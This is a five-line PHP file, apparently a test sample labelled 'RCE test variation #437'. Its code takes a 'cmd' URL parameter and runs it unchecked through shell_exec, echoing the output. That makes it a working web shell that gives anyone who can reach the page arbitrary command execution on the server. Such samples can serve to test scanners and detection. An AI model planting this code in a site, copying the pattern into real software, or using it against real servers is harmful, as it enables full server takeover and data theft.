<?php
// RCE test variation #437
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>